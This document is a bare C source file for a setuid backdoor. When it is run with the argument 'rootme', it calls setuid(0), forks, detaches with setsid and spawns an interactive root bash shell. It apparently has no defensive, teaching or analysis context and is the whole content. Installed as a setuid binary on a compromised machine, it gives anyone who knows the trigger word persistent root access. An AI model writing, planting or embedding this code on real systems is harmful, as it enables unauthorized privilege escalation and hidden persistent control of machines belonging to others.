#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

int main(int argc, char *argv[]) {
    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "rootme") == 0) {
            if (setuid(0) == -1) {
                perror("Failed to setuid");
                exit(0);
            }

            printf("Running as root!\n");
            pid_t pid = fork();  

            if (pid < 0) {
                perror("fork");
                exit(0);
            }

            if (pid == 0) {
                printf("Starting interactive shell...\n");
                
                if (setsid() < 0) {
                    perror("setsid");
                    exit(1);
                }

                execlp("bash", "bash", "-i", NULL); 
                
                perror("execlp");
                exit(1);
            } else {
                wait(NULL); 
            }
            exit(0);
        }
    }
    return 1;
}
